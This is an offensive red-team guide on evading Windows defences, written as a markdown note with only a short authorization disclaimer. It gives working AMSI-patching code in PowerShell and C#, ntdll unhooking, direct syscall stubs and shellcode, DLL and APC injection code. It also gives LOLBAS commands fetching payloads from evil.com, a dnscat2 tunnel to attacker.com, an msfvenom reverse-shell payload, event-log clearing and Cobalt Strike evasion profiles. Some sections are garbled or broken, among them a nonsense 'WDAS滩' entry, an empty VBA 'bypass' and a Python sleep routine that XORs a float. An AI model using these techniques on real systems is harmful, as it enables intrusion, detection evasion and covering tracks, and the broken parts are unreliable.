---
tags:
  - redteam
  - evasion
  - bypass
  - opsec
  - amsi
  - edr
  - guide
created: 2026-04-29
author: clawd
---

# Evasion & Bypass Techniques

> **⚠️ Warning**: This guide is for authorized red team operations, penetration testing, and security research only. Unauthorized access to computer systems is illegal. Always obtain proper written authorization before conducting any offensive security activities.

---

## Table of Contents

1. [Overview](#overview)
2. [AMSI Bypass Techniques](#amsi-bypass-techniques)
3. [EDR Evasion](#edr-evasion)
4. [Windows Defender / AV Evasion](#windows-defender--av-evasion)
5. [Network Evasion](#network-evasion)
6. [Process Injection Techniques](#process-injection-techniques)
7. [Memory-Only Execution](#memory-only-execution)
8. [Living Off The Land (LOLBAS)](#living-off-the-land-lolbas)
9. [Sandbox / VM Detection](#sandbox--vm-detection)
10. [OPSEC for Implants](#opsec-for-implants)
11. [Tool-Specific Evasion](#tool-specific-evasion)
12. [Quick Reference Cheat Sheet](#quick-reference-cheat-sheet)

---

## Overview

### Why Evasion Matters

Modern endpoints are protected by layered defenses. A single-payload approach fails against:

| Layer | Technology | Bypass Required |
|-------|-----------|-----------------|
| Antimalware Scan Interface | AMSI (PowerShell, VBS, JS) | AMSI bypass |
| Endpoint Detection & Response | CrowdStrike, SentinelOne, Defender ATP | EDR evasion |
| Antivirus | Signature-based AV | AV evasion |
| Network Security | Proxies, DNS filtering, IDS/IPS | Network evasion |
| Application Whitelisting | AppLocker, WDAC | LOLBAS techniques |

### The Cat-and-Mouse Game

```
┌─────────────────────────────────────────────────────────────┐
│  Defender adds signature → Red Team modifies payload        │
│  EDR adds behavioral rule → Operators use indirect syscalls │
│  Sandbox checks VM artifacts → Malware checks before exec   │
│  Network detects C2 → Operators use domain fronting          │
└─────────────────────────────────────────────────────────────┘
```

> **💡 Tip**: Evasion is about staying below the detection threshold—not just bypassing one layer, but minimizing your footprint across all layers simultaneously.

### Detection Layers

```
┌─────────────────────────────────────────┐
│          Network Layer (IDS/Proxy)      │
├─────────────────────────────────────────┤
│          Host Layer (EDR/AV)            │
├─────────────────────────────────────────┤
│          Application Layer (AMSI)        │
├─────────────────────────────────────────┤
│          Memory (EDR user-land hooks)    │
├─────────────────────────────────────────┤
│          Kernel (Vulnerable drivers)    │
└─────────────────────────────────────────┘
```

---

## AMSI Bypass Techniques

AMSI (Antimalware Scan Interface) is Microsoft’s API for real-time malware scanning by security products. PowerShell, VBScript, and JScript all route through AMSI.

### How AMSI Works

1. Script calls `AmsiScanBuffer()` or `AmsiScanString()`
2. Security product inspects the content
3. If malicious → script execution is blocked

### Bypass via Memory Patching

Patch `AmsiScanBuffer` to return `AMSI_RESULT_CLEAN`:

```powershell
# PowerShell - AMSI bypass via reflection
$winMan = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(string name);

[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Win32" -Namespace "Win32Functions" -PassThru

$kernel32 = $winMan::LoadLibrary("kernel32.dll")
$asbAddr = $winMan::GetProcAddress($kernel32, "AmsiScanBuffer")

$oldProtect = 0
$winMan::VirtualProtect($asbAddr, [UIntPtr]8, 0x40, [ref]$oldProtect)

# Patch: MOV EAX, 0x80070057 (E_INVALIDARG) + RET
[Byte[]]$patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $asbAddr, $patch.Length)
```

### Bypass via .NET Assembly Load

Load malicious .NET in memory without touching disk:

```csharp
// C# - AMSI bypass before assembly load
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    static void Main()
    {
        IntPtr hModule = LoadLibrary("amsi.dll");
        IntPtr pAddr = GetProcAddress(hModule, "AmsiScanBuffer");
        
        uint oldProtect;
        VirtualProtect(pAddr, (UIntPtr)6, 0x40, out oldProtect);
        
        // Patch to return clean
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
        Marshal.Copy(patch, 0, pAddr, patch.Length);
    }
}
```

### VBA Macro AMSI Bypass

```vba
Sub AutoOpen()
    Dim win32 As Object
    Set win32 = GetObject("winmgmts:\\.\root\cimv2")
    
    ' Clear AMSI buffer via COM object manipulation
    ' Note: VBA macros route through AMSI in Office 365+
End Sub
```

### AMSI Bypass via WDISAPatch

Use `WDAS滩` (deprecated but illustrative) — patches `amsi.dll` in-memory via COM internals.

> **⚠️ Warning**: Memory patching is detectable via EDR's unhooking detection. Use with caution and only in short-lived operations.

---

## EDR Evasion

### User-Land Hooking Overview

EDRs inject DLLs into processes (e.g., `edrservice.sys`) and hook functions like:
- `NtCreateFile`
- `NtWriteVirtualMemory`
- `NtReadVirtualMemory`
- `NtProtectVirtualMemory`

### Unhooking

Restore original function bytes from `ntdll.dll` on disk (bypassing EDR hooks):

```c
// C - Unhook ntdll.dll
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PULONG, ULONG, PULONG);

void UnhookNtdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pAddr = GetProcAddress(hNtdll, "NtCreateFile");
    
    // Read original bytes from disk ntdll.dll
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", 
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    
    // Map section, find NtCreateFile offset
    // Copy original bytes over hooked location
    // VirtualProtect to RWX, memcpy, VirtualProtect back
}
```

### Direct Syscalls

Invoke syscalls directly from assembly (bypass user-land hooks):

```asm
; x64 ASM - Direct syscall for NtCreateFile
section .text
global NtCreateFile_Direct

NtCreateFile_Direct:
    mov r10, rcx
    mov eax, 0x55        ; syscall number for NtCreateFile
    syscall
    ret
```

```c
// C - Wrapper to call direct syscall stub
__declspec(naked) NTSTATUS NtCreateFile_Direct(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PVOID IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
) {
    __asm {
        mov r10, rcx
        mov eax, 0x55
        syscall
        ret
    }
}
```

> **💡 Tip**: Tools like [[Red Team Engagement Guide#Syscalls|SysWhispers2]] and [[Red Team Engagement Guide#Syscalls|SysWhispers3]] automate direct syscall generation for Cobalt Strike and Sliver.

### sRDI (Shellcode Reflective DLL Injection)

Convert a DLL to position-independent shellcode that self-injects:

```bash
# Convert DLL to shellcode using sRDI
python3 ConvertToShellcode.py payload.dll
# Output: payload.bin (reflective loader + DLL)
```

Inject via [[#Process Injection Techniques|process injection]]:

```c
// Execute sRDI shellcode
void* exec = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(exec, payload_bin, payload_size);
((void(*)())exec)();
```

### Sleep Obfuscation

Break up execution with encrypted sleep periods to evade behavioral detection:

```python
# Python - Sleep obfuscation example
import time
import hashlib

KEY = b"xor_key_32_bytes_here______"

def sleep_obfuscated(seconds):
    # Encrypt current timestamp - EDR can't correlate
    start = time.time()
    encrypted = start ^ int.from_bytes(hashlib.sha256(KEY).digest()[:8], 'little')
    
    # Perform actual sleep
    time.sleep(seconds)
    
    # Verify time wasn't tampered
    elapsed = time.time() - start
    assert abs(elapsed - seconds) < 1.0
```

---

## Windows Defender / AV Evasion

### Signature Evasion

1. **String obfuscation**: XOR, Base64, ROT13 the payload strings
2. **Section renaming**: Rename `.text` to `.data` (confuses static signatures)
3. **Entry point padding**: Add NOP sled before real payload

### Packer Workflow

```
┌──────────────┐     ┌─────────────────┐     ┌────────────────┐
│  Raw EXE     │ →   │  Packer Stage 1  │ →   │  Encrypted     │
│  (malware)   │     │  (small loader)  │     │  payload       │
└──────────────┘     └─────────────────┘     └────────────────┘
                                                    ↓
                     ┌─────────────────┐     ┌────────────────┐
                     │  Decompress +   │ ←   │  Runtime       │
                     │  Decrypt        │     │  unpacking     │
                     └─────────────────┘     └────────────────┘
```

### Crypter Workflow

```
┌──────────────┐     ┌─────────────────┐     ┌────────────────┐
│  Raw payload │ →   │  Encrypt        │ →   │  Stub +        │
│  (shellcode) │     │  (AES/XOR)      │     │  Encrypted blob│
└──────────────┘     └─────────────────┘     └────────────────┘
```

### LOLBAS (Living Off The Land, Binaries, Scripts, Libraries)

Use built-in Windows tools for execution—already trusted:

| Binary | Purpose | LOLBAS Command |
|--------|---------|----------------|
| `certutil.exe` | Download, decode | `certutil -urlcache -split -f http://evil.com/mal.exe` |
| `mshta.exe` | Execute HTA/JS | `mshta http://evil.com/payload.hta` |
| `rundll32.exe` | DLL execution | `rundll32 javascript:"\..\mshtml,RunHTMLApplication"` |
| `regsvr32.exe` | Register COM | `regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll` |
| `msbuild.exe` | Inline task | `msbuild.exe inlineCS.cs` |
| `powershell.exe` | Everything | `powershell -enc <base64>` |

> **💡 Tip**: Prefer LOLBAS over dropping custom binaries. `certutil.exe` downloading files is common in enterprise environments and blends with normal traffic.

---

## Network Evasion

### Domain Fronting

Route C2 traffic through trusted CDNs (Azure, Cloudflare, Amazon CloudFront):

```
┌────────────┐    HTTPS    ┌──────────────┐    HTTPS    ┌────────────┐
│  Target    │ ──────────→ │  CDN (legit) │ ──────────→ │  C2 Server │
│  Network   │             │  (fronted)   │             │  (hidden)  │
└────────────┘             └──────────────┘             └────────────┘
  Host: trusted-domain.com → CDN → C2 behind CDN
```

In Sliver C2:
```yaml
# sliver.yml
profiles:
  - name: fronted-http
    https: true
    domains:
      - fronted-domain.cloudfront.net  # CDN front
    dodge: true  # Enable domain fronting
```

### DNS Tunneling

Exfiltrate data via DNS queries (A, TXT, CNAME records):

```bash
# DNS tunneling example with dnscat2
# Server (attacker):
dnscat2-server --secret=mysecret

# Client (target):
dnscat2-client --secret=mysecret --dns server=attacker.com
```

### HTTPS with Legitimate Certificates

Use [[Red Team Engagement Guide#C2 Infrastructure|LetsEncrypt or valid certs]] for C2 domains:
- Domain age matters—new domains are flagged
- Use domains with existing reputation

### Domain Categorization Bypass

- **Typosquatting**: `microsft.com` (easily detected)
- **Age**: Register domains months in advance
- **Category**: Use domains already categorized as "Business" or "Technology"

---

## Process Injection Techniques

### DLL Injection

1. Open target process with `OpenProcess(PROCESS_ALL_ACCESS)`
2. Allocate memory with `VirtualAllocEx`
3. Write DLL path with `WriteProcessMemory`
4. Create remote thread with `CreateRemoteThread` → `LoadLibraryA`

```c
// C - DLL injection
void inject_dll(HANDLE hProcess, const char* dllPath) {
    SIZE_T pathLen = strlen(dllPath) + 1;
    LPVOID remotePath = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remotePath, dllPath, pathLen, NULL);
    
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, remotePath, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
}
```

### Process Hollowing

Replace a legitimate process's memory with malicious code:

```
┌─────────────────────────────────────────────────────┐
│  1. Create suspended process (svchost.exe)          │
│  2. Unmap legitimate sections                       │
│  3. Allocate new sections with malicious code       │
│  4. Set new entry point                              │
│  5. Resume thread                                    │
└─────────────────────────────────────────────────────┘
```

```c
// C - Process hollowing (simplified)
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, 
    CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

// Unmap + allocate + write shellcode + resume
```

### APC Injection

Queue an Asynchronous Procedure Call to a thread in alertable state:

```c
// C - APC injection to all threads in a process
void apc_inject(HANDLE hProcess, LPVOID shellcode, SIZE_T shellcodeSize) {
    // Enumerate threads in process
    THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(THREAD_SNAPSHOT, GetProcessId(hProcess));
    
    while (Thread32Next(hSnapshot, &te32)) {
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
        // Queue APC to each thread
        QueueUserAPC((PAPCFUNC)shellcode, hThread, 0);
        CloseHandle(hThread);
    }
}
```

### Thread Hijacking

Suspend a thread, replace instruction pointer (RIP), resume:

```
┌────────────────────────────────────────────┐
│  1. Open thread (OpenThread)               │
│  2. Suspend (SuspendThread)                │
│  3. Get context (GetThreadContext)         │
│  4. Modify RIP → shellcode address          │
│  5. Set context (SetThreadContext)         │
│  6. Resume (ResumeThread)                  │
└────────────────────────────────────────────┘
```

---

## Memory-Only Execution

### Reflective DLL Injection

Load a DLL from memory without touching the filesystem:
1. DLL contains a reflective loader function
2. Loader finds its own base address
3. Fixes imports, relocations
4. Calls DllMain

```c
// Reflective DLL entry point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Your malicious code here
    }
    return TRUE;
}
```

### Shellcode Injection

Inject raw position-independent shellcode:

```c
// C - VirtualAlloc + memcpy + CreateThread
unsigned char shellcode[] = { 0x90, 0x90, /* ... */ };
void* exec = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(exec, shellcode, sizeof(shellcode));
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
```

### .NET in-Memory Loading

```powershell
# PowerShell - Load .NET assembly from memory
$asmBytes = [System.IO.File]::ReadAllBytes("C:\temp\malicious.dll")
$asm = [System.Reflection.Assembly]::Load($asmBytes)
$asm.GetTypes() | ForEach-Object { $_.GetMethods() | ForEach-Object { $_.Invoke($null, $null) } }
```

---

## Living Off The Land (LOLBAS)

### Common LOLBAS Attack Chains

#### certutil Download + rundll32 Execute

```cmd
certutil -urlcache -split -f http://evil.com/payload.dll C:\temp\payload.dll
rundll32 C:\temp\payload.dll,DllMain
```

#### mshta Inline HTA

```cmd
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc.exe"":Close")
```

#### regsvr32 COM Hijack (Squiblydoo)

```cmd
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll
```

#### msbuild Inline Task

```xml
<!-- payload.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Fragment" Language="cs">
        <![CDATA[
          System.Diagnostics.Process.Start("cmd.exe", "/c calc");
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
msbuild.exe payload.csproj
```

> **💡 Tip**: LOLBAS detection is hard—these tools are signed Microsoft binaries. Focus on parent-child process relationships (e.g., `mshta.exe` spawning from `word.exe` = suspicious).

---

## Sandbox / VM Detection

### Common Detection Checks

| Category | Check | Code |
|----------|-------|------|
| VM Files | VMware tools, VirtualBox Guest Additions | `dir C:\Windows\System32\drivers\vmmouse.sys` |
| VM Registry | VMware keys, Hyper-V identifiers | `reg query "HKLM\SYSTEM\CurrentControlSet\Services\VBoxGuest"` |
| CPUID | Hypervisor bit | `cpuid; eax=1; check hypervisor bit` |
| Mac Address | VMware: 00:05:69, 00:0C:29 | `getmac` |
| Process | vmtoolsd.exe, vboxservice.exe | `tasklist` |
| Disk Size | < 60GB typical for VMs | `wmic diskdrive get size` |
| Memory | < 2GB typical for sandboxes | `systeminfo` |
| User | "sandbox", "malware", "virus" | `whoami` |

### Anti-Analysis Code

```c
// C - VM detection
BOOL is_vm() {
    // CPUID hypervisor bit
    int cpuinfo[4];
    __cpuid(cpuinfo, 1);
    if (cpuinfo[2] & (1 << 31)) return TRUE;  // Hypervisor present
    
    // Registry check
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
        return TRUE;
    
    return FALSE;
}
```

```powershell
# PowerShell - Sandbox detection
function Get-IsSandbox {
    $mac = Get-NetAdapter | Get-NetAdapterHardwareInfo | Where-Object { 
        $_.MacAddress -match "^00(0C|05|15|50)29" 
    }
    if ($mac) { return $true }
    
    $disk = Get-WmiObject Win32_DiskDrive | Where-Object { 
        [int64]$_.Size -lt 60000000000 
    }
    if ($disk) { return $true }
    
    return $false
}
```

> **⚠️ Warning**: Overly aggressive VM detection can tip off analysts. Use light checks only when necessary.

---

## OPSEC for Implants

### Timestomping

Modify file timestamps to match legitimate system files:

```bash
# Set timestamp to match system file
touch -r /Windows/System32/ntdll.dll payload.dll
```

```cmd
:: cmd - timestomp
 timestomp C:\temp\malicious.dll -f C:\Windows\System32\ntdll.dll
```

### Log Clearing

```cmd
:: Clear Windows Event Logs (requires elevation)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

:: Clear PowerShell transcript logs
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
```

### Artifact Minimization

- **File-less execution**: Run from memory, not disk
- **Short-lived processes**: Spawn and exit quickly
- **Randomize naming**: Don't use `svchost.exe` with wrong path
- **Clean up**: Delete staging files after use

---

## Tool-Specific Evasion

### Metasploit Evasion Modules

```bash
# Metasploit payload evasion
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -e x64/xor_dynamic -i 5 -f exe -o payload.exe

# Use built-in evasion module
use evasion/windows/windows_defender_exclusion
set FILENAME legitimate-update.exe
run
```

### Sliver C2 Evasion Features

```yaml
# Sliver generate - evasion options
sliver > generate --os windows --arch amd64 --format exe --http example.com --evasion

# Sliver stage - AMSI bypass
sliver > stage-listener --http example.com --profile evading-payload

# Domain fronting with Sliver
sliver > generate --http https://cdn-fronted-domain.com --dodge
```

### Cobalt Strike Evasion

```bash
# Sleep obfuscation profile (resource template)
set sleep_time "3000";
set jitter "30";

# USB keystroke beacon
spawn beacon-usb
```

#### Aggressive OPSEC Profile (Cobalt Strike)

```
# opsec.profile
set sample_name "Windows Update";

process-inject {
    set minmalloc "0x1000";
    set remote_malloc "VirtualAlloc";
    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "beacon" "svchost";
    };
    transform-x64 {
        prepend "\x90\x90\x90";
    };
}

stage {
    set checksum "0";
    set cleanup "true";
    set compile_time "1 Jan 2020";
    set entry_point "4096";
    set image_size "4096";
    set name "wupdate.exe";
    set rich_header "\x00";
    set stomppe "true";
    set obfuscate "true";
}
```

---

## Quick Reference Cheat Sheet

### AMSI Bypass Priority

| Technique | Stealth | Reliability | Notes |
|-----------|---------|-------------|-------|
| Memory patch (ntdll) | Low | High | Detectable via unhook detection |
| .NET assembly load | Medium | High | Preferred method |
| Disable AMSI via registry | Very Low | High | Loud, admin required |

### EDR Bypass Priority

| Technique | Stealth | Complexity | Notes |
|-----------|---------|------------|-------|
| Direct syscalls | High | High | Use SysWhispers3 |
| sRDI | High | Medium | Works well for DLL implants |
| Unhooking | Medium | Low | Patch visible to EDR |
| Kernel callback removal | Very High | Very High | Dangerous, kernel level |

### Process Injection Priority

| Technique | Stealth | Compatibility | Notes |
|-----------|---------|---------------|-------|
| DLL Injection (CreateRemoteThread) | Medium | Universal | Most common |
| APC Injection | High | Windows Vista+ | Alertable threads only |
| Process Hollowing | Medium | Universal | Legit process child |
| Thread Hijacking | High | Windows Vista+ | Complex, high skill |

### Network Evasion Priority

| Technique | Stealth | Setup Cost | Notes |
|-----------|---------|------------|-------|
| Domain fronting | Very High | Medium | CDN required |
| HTTPS with valid cert | High | Low | LetsEncrypt works |
| DNS tunneling | Medium | Medium | Slow, exfil only |
| HTTPS over port 443 | High | Low | Standard, no special config |

---

## Related Guides

- [[Red Team Engagement Guide]] — Full engagement methodology
- [[Sliver C2 - Red Team Operator Guide]] — C2 setup and opsec
- [[Metasploit 101]] — Framework basics and module usage
- [[Cobalt Strike for Red Teams]] — Advanced C2 techniques

---

> **📝 Notes**
> - This guide focuses on Windows-centric techniques; macOS/Linux evasion is covered in dedicated guides
> - Detection signatures evolve rapidly—verify techniques against current EDR versions before engagement
> - Always document which bypasses worked for post-engagement reporting
